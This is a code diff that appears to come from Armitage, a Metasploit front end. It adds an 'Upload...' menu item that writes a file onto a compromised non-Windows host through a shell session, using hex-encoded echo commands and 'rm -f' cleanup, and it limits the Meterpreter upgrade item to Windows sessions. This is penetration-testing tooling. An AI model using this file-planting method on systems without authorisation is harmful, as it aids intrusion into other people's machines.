@@ -12,6 +12,8 @@ import javax.swing.*;
 import javax.swing.event.*;
 import javax.swing.table.*;
 
+import msf.*;
+
 global('%shells $ashell $achannel %maxq');
 
 %handlers["execute"] = {
@@ -135,9 +137,68 @@ sub shellPopup {
 
 sub showShellMenu {
 	item($1, "Interact", 'I', lambda(&createShellSessionTab, \$sid, \$session));
-	item($1, "Meterpreter...", 'M', lambda({
-		call($client, "session.shell_upgrade", $sid, $MY_ADDRESS, randomPort());
-	}, \$sid));
+
+	if ("*Windows*" iswm sessionToOS($sid)) {
+		item($1, "Meterpreter...", 'M', lambda({
+			call($client, "session.shell_upgrade", $sid, $MY_ADDRESS, randomPort());
+		}, \$sid));
+	}
+	else {
+		item($1, "Upload...", 'U', lambda({
+			local('$file $name $n');
+			$file = chooseFile($title => "Select file to upload");
+			$name = getFileName($file);
+
+			if ($file !is $null) {
+				local('$progress');
+				$progress = [new ProgressMonitor: $null, "Uploading $name", "Uploading $name", 0, lof($file)];
+
+				call($client, "session.shell_write", $sid, [Base64 encode: "rm -f $name $+ \n"]);
+
+				thread(lambda({
+					local('$handle $bytes $string $t $start $n $cancel');
+					$handle = openf($file);
+					$start = ticks();
+
+					while $bytes (readb($handle, 768)) {
+						if ([$progress isCanceled]) {
+							call($client, "session.shell_write", $sid, [Base64 encode: "rm -f $name $+ \n"]);
+							closef($handle);
+							return;
+						}
+
+						# convert the bytes to \x##\x## ...
+						$string = join("", map({ 
+							if ($1 <= 0xf) {
+								return "\\x0" . formatNumber($1, 10, 16); 
+							}
+							return "\\x" . formatNumber($1, 10, 16); 
+						}, unpack("B*", $bytes)));
+
+						call($client, "session.shell_write", $sid, [Base64 encode: "echo \" $+ $string $+ \\c\" >> $+ $name $+ \n"]);
+
+						$t += strlen($bytes);
+						[$progress setProgress: $t]; 
+						$n = (ticks() - $start) / 1000.0;
+						if ($n > 0) {
+							[$progress setNote: "Speed: " . round($t / $n) . " bytes/second"];
+						}
+
+						yield 1;
+
+						if (available($handle) == 0) {
+							closef($handle);
+							return;
+						}
+					}
+
+					closef($handle);
+					return;
+				}, \$file, \$sid, \$progress, \$name));
+			}
+		}, \$sid));
+	}
+
 	separator($1);
 	item($1, "Disconnect", 'D', lambda({
 		call($client, "session.stop", $sid);
